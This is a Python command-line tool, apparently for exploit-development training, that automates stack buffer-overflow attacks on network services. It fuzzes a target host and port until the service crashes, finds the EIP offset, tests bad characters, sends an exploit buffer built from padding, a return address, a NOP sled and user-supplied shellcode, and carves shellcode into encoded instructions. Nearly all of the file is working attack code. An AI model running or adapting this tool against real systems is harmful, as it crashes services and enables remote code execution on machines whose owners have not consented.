#!/usr/bin/env python3

import socket
import os
import sys
import argparse
from time import sleep
from random import choice
from colorama import Fore,Style

__version_info__ = ('v1','01')
__version__ = '.'.join(__version_info__)

banner = (
" __    __            _ _                                              _   _     \n"
"/ / /\ \ \___   ___ | | |_   _  /\/\   __ _ _ __ ___  _ __ ___   ___ | |_| |__  \n"
"\ \/  \/ / _ \ / _ \| | | | | |/    \ / _` | '_ ` _ \| '_ ` _ \ / _ \| __| '_ \ \n"
" \  /\  / (_) | (_) | | | |_| / /\/\ \ (_| | | | | | | | | | | | (_) | |_| | | |\n"
"  \/  \/ \___/ \___/|_|_|\__, \/    \/\__,_|_| |_| |_|_| |_| |_|\___/ \__|_| |_|\n"
"                         |___/                                                  \n"
+ __version__ + "\n")

parser = argparse.ArgumentParser(description='Woolly Mammoth Fuzzing and Exploitation Toolkit')


subparser = parser.add_subparsers(dest="subparser")
fuzz = subparser.add_parser('fuzz', help='Socket-based fuzzer that allows command prefix (optional)')
offset = subparser.add_parser('offset', help='Sending unique string pattern to identify EIP offset in a debugger.')
badchars = subparser.add_parser('badchars', help='Toolset to help identify bad character usage in target applications.')
eip = subparser.add_parser('eip', help='Enter the offset pattern hex string to identify the offset value.')
exploit = subparser.add_parser('exploit', help='Create buffer-overflow exploit on the command line with optional prefix.')
carve = subparser.add_parser('carve', help='Stack manipulation carving (egghunters, shellcode, etc)')

#fuzz.add_argument('--fuzz','-f',help='Fuzz value (using optional prefix)',action='store_true',required=False,default=False,dest='fuzz')
fuzzRequired = fuzz.add_argument_group('Required Arguments')
fuzzRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
fuzzRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
fuzz.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")

#offset.add_argument('--offset','-o',help='Send offset pattern string',action='store_true',required=False,default=False,dest='offset')
offsetRequired = offset.add_argument_group('Required Arguments')
offsetRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
offsetRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
offset.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")

eipRequired = eip.add_argument_group('Required Arguments')
eipRequired.add_argument('--eip','-e',help='Enter the EIP value to identify offset code.',required=True,default="",dest='eip')

exploitRequired = exploit.add_argument_group('Required Arguments')
exploitRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
exploitRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
exploitRequired.add_argument('--eip','-e',help='Enter the EIP JMP/PUSH;RET address as assembly shellcode.',required=True,dest='eip',default="",type=str)
exploitRequired.add_argument('--offset','-o',help='Enter the EIP offset value as an integer.',required=True,dest='offset',type=int,default="")
exploitRequired.add_argument('--shellcode','-s',help='Enter the shellcode for the exploit.',required=True,dest='shellcode',type=str)
exploit.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
exploit.add_argument('--nops','-n',help='Enter the number of NOPs to send as an integer (default: 10).',required=False,dest='nops',default=10,type=int)

carveRequired = carve.add_argument_group('Required Arguments')
carveRequired.add_argument('--shellcode','-s',help="Enter the shellcode to be converted (e.g. an egghunter)",required=True,dest='egghunter')
carve.add_argument('--esp','-e',help="Enter the ESP value at the start of the carved shellcode",required=False,dest='curr_esp')
carve.add_argument('--dest-esp','-d',help="Enter the address that should contain the carved shellcode",required=False,dest='dest_esp')

badcharsRequired = badchars.add_argument_group('Required Arguments')
badcharsRequired.add_argument('--target','-t',help='Enter the target host IP address.',required=True,default="",dest='target')
badcharsRequired.add_argument('--port','-p',help='Enter the target port number.',required=True,dest='port',type=int)
badcharsRequired.add_argument('--buffer','-b',help="Specify the buffer size",required=True,dest='buffer',type=int)
badchars.add_argument('--offset','-o',help="Specify the buffer offset to prefix 'A' characters before the bad characters (if not specified then bad chars will be sent at the start of the payload)",required=False,dest='offset',type=int,default=0)
badchars.add_argument('--prefix',help='(Optional) Enter the prefix for the command.',required=False,dest='prefix',default="")
badchars.add_argument('--alpha','-a',help="Only send alpha-characters",required=False,dest='alpha',action="store_true")
badchars.add_argument('--non-alpha','-n',help="Only send non-alpha characters",required=False,dest='nonalpha',action="store_true")

args = parser.parse_args()

if (len(sys.argv) == 1):
    parser.print_help(sys.stderr)
    sys.exit(1)

carveShellcode = ""

# Carving - Bad Character arrays

# Modify badChars as necessary
# badChars = [ 0x00 ]         
badChars = [ 0x00, 0x0a, 0x0d, 0x2f, 0x3a, 0x3f, 0x40, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 
           0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 
           0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5, 
           0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf, 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 
           0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 
           0xc4, 0xc5, 0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0, 0xd1, 0xd2, 
           0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb, 0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 
           0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 
           0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 0xff]

allChar =[0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
          0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
          0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
          0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b,
          0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
          0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41,
          0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c,
          0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
          0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62,
          0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d,
          0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
          0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82, 0x83,
          0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e,
          0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99,
          0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f, 0xa0, 0xa1, 0xa2, 0xa3, 0xa4,
          0xa5, 0xa6, 0xa7, 0xa8, 0xa9, 0xaa, 0xab, 0xac, 0xad, 0xae, 0xaf,
          0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba,
          0xbb, 0xbc, 0xbd, 0xbe, 0xbf, 0xc0, 0xc1, 0xc2, 0xc3, 0xc4, 0xc5,
          0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xcb, 0xcc, 0xcd, 0xce, 0xcf, 0xd0,
          0xd1, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xdb,
          0xdc, 0xdd, 0xde, 0xdf, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6,
          0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1,
          0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc,
          0xfd, 0xfe, 0xff]
          
alpha = [0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42,
         0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
         0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
         0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a]
         
availChars = []

# Arrays for 'badchars' argument - not related to carving

badCharsArray = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
        "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
        "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
        "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
        "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
        "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
        "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
        "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
        "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

badCharsAlphaArray = (
        "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
        "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55"
        "\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
        "\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a"
)

badCharsNonAlphaArray = (
        "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
        "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
        "\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a"
        "\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a"
        "\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa"
        "\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba"
        "\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca"
        "\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda"
        "\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
        "\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa"
        "\xfb\xfc\xfd\xfe\xff"
)

def PrintGreen(text):
    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintBlue(text):
    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintRed(text):
    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def find_str(s, char):
    index = 0

    if char in s:
        c = char[0]
        for ch in s:
            if ch == c:
                if s[index:index+len(char)] == char:
                    return index

            index += 1

    return -1
    
def carveEncode(x):

    global carveShellcode
    # Inspiration from https://github.com/Keramas/ShellcodeCarver/blob/master/example.py - Thank you!

    carveVal = [x[i:i+2] for i in range(0, len(x), 2)]
    row1=a1 = int(carveVal[0],16)
    row2=a2 = int(carveVal[1],16)
    row3=a3 = int(carveVal[2],16)
    row4=a4 = int(carveVal[3],16)
    
    row4Loop = 0
    row3Loop = 0
    row2Loop = 0
    row1Loop = 0
    
    if (row4 == 0):
        row4=a4 = int("0x100",16)
        row3Loop = 1
        
    if (row3 == 0):
        row3=a3 = int("0x100",16)
        row2Loop = 1
        
    if (row2 == 0):
        row2=a2 = int("0x100",16)
        row1Loop = 1
        
    if (row1 == 0):
        row1=a1 = int("0x100",16)
        
    b1=b2=b3=b4=c1=c2=c3=c4=d1=d2=d3=d4 = ""

    while row4 != row4Loop:
        try:
        
            b4 = choice(availChars)
            c4 = choice(availChars)
            d4 = choice(availChars)
            
            if (a4 - int(str(b4),16) - int(str(c4),16) - int(str(d4),16) == row4Loop):
                break
        except Exception as e:
            b4=c4=d4=""
            print (e)
            break
                
    while row3 != row3Loop:
        try:
        
            b3 = choice(availChars)
            c3 = choice(availChars)
            d3 = choice(availChars)
            
            if (a3 - int(str(b3),16) - int(str(c3),16) - int(str(d3),16) == row3Loop):
                break
        except Exception as e:
            b3=c3=d3=""
            print (e)
            break               
    
    while row2 != row2Loop:
        try:
        
            b2 = choice(availChars)
            c2 = choice(availChars)
            d2 = choice(availChars)
            
            if (a2 - int(str(b2),16) - int(str(c2),16) - int(str(d2),16) == row2Loop):
                break
        except Exception as e:
            b2=c2=d2=""
            print (e)
            break    
        
    while row1 != row1Loop:
        try:
        
            b1 = choice(availChars)
            c1 = choice(availChars)
            d1 = choice(availChars)
            
            if (a1 - int(str(b1),16) - int(str(c1),16) - int(str(d1),16) == row1Loop):
                break
        except Exception as e:
            b1=c1=d1=""
            print (e)
            break

    carveShellcode += ("\\x2d" +(padAndStrip(b4) + padAndStrip(b3) + padAndStrip(b2) + padAndStrip(b1)))
    carveShellcode += ("\\x2d" +(padAndStrip(c4) + padAndStrip(c3) + padAndStrip(c2) + padAndStrip(c1)))
    carveShellcode += ("\\x2d" +(padAndStrip(d4) + padAndStrip(d3) + padAndStrip(d2) + padAndStrip(d1)))

    return

def padAndStrip(byte):
    address = str.format('\\x{:02x}', int(byte,16))
    return address
    
def main():
    global carveShellcode
    print (banner)

    # Variables

    try:
        host = args.target
        port = args.port
        print (PrintBlue("[i]") + " Target:\t\t" + args.target + ":" + str(args.port))
        print (PrintBlue("[i]") + " Prefix:\t\t" + args.prefix)
    except:
        host = ""
        port = ""
        
    bufRan = ""
    bufStart = 50

    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lower = "abcdefghijklmnopqrstuvwxyz"
    number = "0123456789"

    for u in upper:
        for l in lower:
            for n in number:
                    bufRan += u + l + n


    if (args.subparser == "fuzz"):
        prevBufLength = 0
        while (True):
            buffer = args.prefix.strip() + bufRan[:bufStart]

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.settimeout(3)
                x = s.recv(1024)
                s.send(buffer.encode())
                bufLength = (len(buffer) - len(args.prefix))
                prevBufLength = bufLength
                #delete_last_lines()
                print(PrintBlue("[i]") + " Fuzzing:\t\t" + str(bufLength) + " Bytes", end='\r')
                s.close()
                sleep(0.5)
                bufStart += 50
            except:
                print (sys.exc_info())
                print ("\nInformation:")
                print (PrintGreen("[+]") + " Server crashed between " + str(prevBufLength - 50) + " and %s Bytes" % str(len(buffer) - len(args.prefix)))
                print (PrintRed("[!]") + " Send offset pattern using '-o' to identify EIP offset")
                sys.exit()
                
            buffer = args.prefix + bufRan[:bufStart]

    elif (args.subparser == "offset"):
        try:
            buffer = args.prefix.strip() + bufRan
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(3)
            x = s.recv(1024)
            s.send(buffer.encode())
            s.close()
            sleep(0.5)
            bufStart += 100
            print ("\nInformation:")
            print (PrintRed("[!]") + " Check EIP for offset value")
        except:
            sys.exit()
            
    elif (args.subparser == "badchars"):
        if (args.nonalpha):
            bcInfo = "Non-Alpha (0x01 - 0x2F, 0x7B - 0xFF)"
            bcBuf = badCharsNonAlphaArray
        elif (args.alpha):
            bcInfo = "Alpha (0x30 - 0x7A)"
            bcBuf = badCharsAlphaArray
        else:
            bcInfo = "All Characters (0x01 - 0xFF)"
            bcBuf = badCharsArray
            
        print (PrintBlue("[i]") + " Bad Chars:\t\t" + bcInfo)
        
        try:
            if (args.offset == 0):
                buffer = args.prefix.strip() + bcBuf
                buffer += buffer + ("A" * (args.buffer - len(buffer)))
            else:
                buffer = args.prefix.strip()
                buffer += buffer + ("A" * args.offset)
                buffer += bcBuf
                if (args.buffer > len(buffer)):
                    buffer += "B" * (args.buffer - len(buffer))
                else:
                    buffer += "B" * args.buffer
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.settimeout(3)
            x = s.recv(1024)
            s.send(buffer.encode())
            s.close()
            sleep(0.5)
            bufStart += 100
            print ("\nInformation:")
            print (PrintRed("[!]") + " Check stack around ESP for bad / mangled characters")
        except:
            sys.exit()
            
    elif (args.subparser == "eip"):
        offsetHex = args.eip
        offsetAscii = (bytearray.fromhex(offsetHex).decode())
        offsetPosition = find_str(bufRan,offsetAscii)
        
        if (offsetPosition == -1):
            offsetAscii = (bytearray.fromhex(offsetHex).decode())[::-1]
            offsetPosition = find_str(bufRan,offsetAscii)

        print (PrintBlue("[i]") + " EIP Value: \t\t" + offsetHex)
        print (PrintBlue("[i]") + " EIP Value ASCII: \t" + offsetAscii)
        print (PrintGreen("[+]") + " Offset Position: \t" + str(offsetPosition))
        print ("\nNext Steps:")
        print (PrintRed("[!]") + " Locate vulnerable libraries with Mona: !mona modules")
        print (PrintRed("[!]") + ' Identify valid JMP with Mona: !mona find -s "\\xff\\xe4" -m "essfunc.dll"')
        print (PrintRed("[!]") + ' Identify valid PUSH RET with Mona: !mona find -s "\\x5c\\xc3" -m "essfunc.dll"')
        
        
    elif (args.subparser == "exploit"):
        print (PrintBlue("[i]") + " EIP JMP/PUSH: \t" + str(args.eip))
        print (PrintBlue("[i]") + " EIP Offset Length: \t" + str(args.offset))    
        print (PrintBlue("[i]") + " NOPs: \t\t" + str(args.nops))    
              
        nops = b"\x90" * args.nops
        
        # very hacky method of getting shellcode to send over a socket from command line
        #               Prefix                             Offset                                             EIP                                      NOPS                            Shellcode
        buffer = args.prefix.strip().encode() + ("A" * int(args.offset)).encode() + bytearray([int(x, 16) for x in args.eip.split("\\x") if len(x)]) + nops + bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)])

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(buffer)
        s.close()
        
    elif (args.subparser == "carve"):
    
        startEsp = args.curr_esp
        destEsp = args.dest_esp
        if (len(startEsp) > 0 and len(destEsp) > 0):
            print (PrintBlue("[i]") + " ESP start of carved code: \t\t{}".format(PrintGreen(startEsp.upper())))
            print (PrintBlue("[i]") + " Code carved to ESP address: \t{}".format(PrintGreen(destEsp.upper())))
        
        a = args.egghunter.replace("\\x","")
        scStringLength = str(int(len(args.egghunter) / 4))
        
        if (int(scStringLength) > 32):
            if (int(scStringLength) % 4 != 0):
                a = (a + ("90" * (4 - (int(scStringLength) % 4))))
                scStringLength = str(int(scStringLength) + (4 - (int(scStringLength) % 4)))
        print (PrintBlue("[i]") + " Carving {} bytes of Shellcode".format(PrintGreen(scStringLength)))       
        for x in allChar:
            if x not in badChars:
                
                availChars.append(hex(x))       
        # Zero EAX
        carveShellcode = (("\\x25\\x4a\\x4d\\x4e\\x55"))
        carveShellcode += ("\\x25\\x35\\x32\\x31\\x2a")
        
        # Save ESP into EAX
        carveShellcode += ("\\x54\\x58")
        
        if args.curr_esp and args.dest_esp:
            # SUB EAX to set ESP to necessary underflow 
            # SUB EAX
            # SUB EAX
            # SUB EAX
            # PUSH EAX, POP ESP
            x  = hex((int(destEsp,16) - int(startEsp,16))).replace("0x","")
            diff_esp = int("FFFFFFFF",16) - int(x,16)
            carveEncode(str(hex(diff_esp)[2:]))
        
        else:
            print ("CALCULATE ESP ALIGNMENT MANUALLY")
        # PUSH EAX, POP ESP
        carveShellcode += ("\\x50\\x5c")
        
        rev = ("".join(reversed([a[i:i+2] for i in range(0, len(a), 2)])))
        n = 8
        rev_list = [rev[i:i+n] for i in range(0, len(rev), n)]
        totalCarveBytes = len(rev_list)
        countCarveBytes = 0
        for x in rev_list:
            hex_x = (int(x, 16)) #[2:]
            out = (hex(int("FFFFFFFF",16) - hex_x + int("1",16))[2:])
            if (len(out) < 8):
                out = (("0" * (8 - len(out))) + out)

            # Zero EAX
            carveShellcode += (("\\x25\\x4a\\x4d\\x4e\\x55"))
            carveShellcode += ("\\x25\\x35\\x32\\x31\\x2a")
            #Carve
            carveEncode(out)
            # PUSH EAX, POP ESP
            carveShellcode += ("\\x50")  
            
            countCarveBytes += 1
            print(PrintBlue("[i]") + " Carving:\t\t\t\t" + PrintGreen(out) + " : " + str(countCarveBytes) + "/" + str(totalCarveBytes) + " Complete", end='\r')
            
        print (PrintGreen("[+]") + " Carved Shellcode Size: {} bytes:\n".format(PrintRed(str(int(len(carveShellcode) / 4)))))
        print ("carvedShell = \"" + carveShellcode + "\"")

if __name__ == "__main__":
    main()



